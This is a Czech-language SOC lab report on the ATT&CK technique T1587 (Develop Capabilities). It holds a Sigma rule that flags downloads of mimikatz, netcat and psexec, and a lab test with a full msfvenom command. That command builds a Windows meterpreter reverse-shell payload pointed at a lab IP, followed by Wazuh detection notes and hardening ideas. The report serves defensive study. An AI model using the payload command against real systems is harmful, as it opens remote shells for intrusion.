🛠️ Taktika: Resource Development (02)

Technika: T1587 - Develop Capabilities (Vývoj nástrojů)

Tento report dokumentuje fázi, kdy útočník připravuje své nástroje, skripty nebo payloady před samotným útokem. Slouží jako vzor pro zápis libovolné techniky spadající pod taktiku Resource Development.

🧠 Teoretický základ (Co se učím)

Vztah Taktika vs. Technika

Taktika (Proč): Resource Development – Útočník potřebuje vytvořit zázemí a nástroje pro budoucí operace.

Technika (Jak): Develop Capabilities – Konkrétní činnost psaní kódu nebo kompilace malwaru.

Co je to Taktika: Resource Development?

Taktika představuje fázi, kdy útočník buduje a získává prostředky pro své operace.

Cíl: Vytvořit nebo získat malware, certifikáty, servery (C2) nebo botnety.

Proč to útočník dělá: Aby měl připravené "zbraně" a infrastrukturu, která mu umožní proniknout do cíle a komunikovat s ním.

🌐 Kontext a Vrstvy

OSI Model Context

Tato fáze se často děje mimo cílovou síť (na stroji útočníka), ale v SOCu ji můžeme detekovat, pokud:

Vrstva 7 (Application): Útočník stahuje známé nástroje (mimikatz, cobalt strike) z internetu přes HTTP/HTTPS.

Vývoj (Endpoint): Detekce kompilace kódu (např. spouštění gcc nebo csc.exe pro kompilaci malwaru) na sledovaném útočném stroji.

Datové zdroje (Data Sources)

File Metadata: Hash stažených nástrojů.

Network Traffic: Stahování z podezřelých domén.

Web Proxy Logs: Filtrace URL adres.

🛡️ Stav Detekce a Obrany

Stav: ⚪ Často obtížné detekovat (pokud se to děje mimo síť).

Detekční logika: Monitorování stahování neobvyklých typů souborů (.exe, .ps1, .sh) ze známých repozitářů (GitHub, Pastebin).

📑 Sigma Rule (Příklad detekce stahování nástrojů)

title: Hacktool Download Detected
status: experimental
description: Detekuje stahování známých hackerských nástrojů podle názvu souboru.
logsource:
    category: proxy
detection:
    selection:
        TargetFilename|endswith: 
            - '\mimikatz.exe'
            - '\nc.exe'
            - '\psexec.exe'
    condition: selection


⚔️ [DD.MM.RRRR] - Test 01: Příprava Payloadu na Kali Linuxu

🔴 Útok (Simulation)

Nástroj: MSFVenom / Metasploit

Cíl: Příprava payloadu pro Windows 11.

Příkaz:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.30 LPORT=4444 -f exe > shell.exe


🔍 Výsledek a Analýza (Detection)

Wazuh Alert: Pokud máš agenta na Kali, uvidíš spuštění procesu msfvenom.

Pozorování: Vytvoření souboru shell.exe v pracovním adresáři.

📜 Traceability: Analýza logů

Původ: Agent na útočném stroji (Kali Linux - 192.168.20.30).

Cesta: Kali (Local file creation) -> Wazuh Agent -> Wazuh Manager (Alerting).

⚠️ Analýza falešných pozitiv (False Positives)

Vývojáři v síti kompilují vlastní legitimní aplikace.

Administrátoři stahují nástroje pro vzdálenou správu (např. Sysinternals).

💡 Možnosti zlepšení (Hardening)

Reputační filtry: Blokování přístupu k známým hackerským fórům a repozitářům na úrovni DNS/Proxy.

EDR: Sledování vzniku nepodepsaných spustitelných souborů ve složkách jako Downloads nebo Temp.
